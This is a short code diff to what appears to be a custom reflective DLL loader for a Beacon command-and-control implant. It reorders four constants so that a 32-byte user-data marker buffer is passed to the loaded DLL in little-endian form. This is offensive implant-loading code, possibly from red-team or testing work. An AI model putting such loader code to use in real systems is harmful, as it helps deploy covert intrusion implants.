@@ -551,11 +551,10 @@ __declspec(dllexport) ULONG_PTR WINAPI ReflectiveLoader(LPVOID lpParameter)
 #if defined(BW_UDRL_USER_DATA_DELIVER)
     /* 4.9 Beacon User Data: deliver a 32-byte custom buffer with reason
      * 0x0d BEFORE the standard PROCESS_ATTACH - the official contract.
-     * Four volatile QWORD stores: volatile defeats the compiler's XMM
-     * vectorization (free byte-stores became __xmm@ .rdata constants -
-     * unknown-symbol extraction failures, observed live) and the harness
-     * bake carries only the .text section. Build with
-     * /DBW_UDRL_USER_DATA_DELIVER=1 to enable. */
+     * Four volatile QWORD stores (volatile defeats XMM vectorization into
+     * .rdata; the bake carries only .text). QWORD values are built
+     * LITTLE-ENDIAN so the in-memory buffer reads as the marker string.
+     * Build with /DBW_UDRL_USER_DATA_DELIVER=1 to enable. */
     {
         struct { unsigned int length; unsigned int version; void *syscalls; char custom[32]; } ud;
         volatile unsigned long long * dst;
@@ -563,10 +562,10 @@ __declspec(dllexport) ULONG_PTR WINAPI ReflectiveLoader(LPVOID lpParameter)
         ud.version = 1;
         ud.syscalls = NULL;
         dst = (volatile unsigned long long *)ud.custom;
-        *dst++ = 0x5033554430313233ULL;
-        *dst++ = 0x3435363738394142ULL;
-        *dst++ = 0x434445464748494AULL;
-        *dst++ = 0x4B4C4D4E4F505859ULL;
+        *dst++ = 0x3332313044553350ULL;
+        *dst++ = 0x4241393837363534ULL;
+        *dst++ = 0x4A49484746454443ULL;
+        *dst++ = 0x5958504F4E4D4C4BULL;
         dllmain((void *)sc_base, 0x0d, &ud);
     }
 #endif
